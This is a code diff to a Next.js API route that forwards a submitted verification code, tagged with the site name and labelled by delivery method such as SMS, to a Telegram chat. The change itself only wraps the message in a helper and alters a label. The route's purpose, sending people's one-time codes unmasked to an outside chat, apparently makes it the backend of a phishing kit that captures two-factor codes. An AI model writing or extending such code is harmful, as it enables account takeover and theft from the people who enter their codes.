@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { sendTelegramMessage, getSiteName } from '@/lib/telegram';
+import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';
 
 const METHOD_LABELS = {
   text: 'Text Message (SMS)',
@@ -25,12 +25,11 @@ export async function POST(request) {
     const message = [
       `🏷 Site: ${escapeHtml(getSiteName())}`,
       '',
-      '✅ <b>Verification Code Submitted</b>',
-      `🔐 Type: ${escapeHtml(label)}`,
+      '🔑 <b>Verification Code Submitted</b>',
       `🔢 Code: ${code}`,
     ].join('\n');
 
-    await sendTelegramMessage(message);
+    await sendTelegramMessage(wrapFlowMessage(message));
     return NextResponse.json({ ok: true });
   } catch (err) {
     console.error('notify-verify-code:', err);
